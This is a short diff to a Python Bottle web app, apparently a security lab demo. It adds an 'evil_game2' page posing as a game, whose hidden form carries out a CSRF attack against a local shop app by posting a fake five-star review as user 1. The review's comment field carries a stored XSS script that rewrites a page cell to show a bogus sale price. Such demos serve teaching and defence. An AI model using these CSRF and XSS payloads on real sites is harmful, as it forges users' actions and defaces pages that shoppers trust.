@@ -30,7 +30,7 @@ def add_user():
     redirect('http://localhost:8080/logout')
 
 @route('/evil_game1')
-def show_game():
+def show_game1():
     return '''
 <p>とっても楽しいゲームだよ！</p>
 <form action="http://localhost:8080/reviews" method="post">
@@ -38,6 +38,21 @@ def show_game():
   <input type="hidden" name="user_id" value="1" />
   <input type="hidden" name="rate" value="5" />
   <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
+  <input type="submit" value="遊んでみる" />
+</form>'''
+
+@route('/evil_game2')
+def show_game2():
+    return '''
+<p>いまだかつてないくらい楽しいゲームだよ！</p>
+<form action="http://localhost:8080/reviews" method="post">
+  <input type="hidden" name="product_id" value="1" />
+  <input type="hidden" name="user_id" value="1" />
+  <input type="hidden" name="rate" value="5" />
+  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
+      var td = document.querySelectorAll('tr td')[7];
+      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
+  }</script>" />
   <input type="submit" value="遊んでみる" />
 </form>'''
 
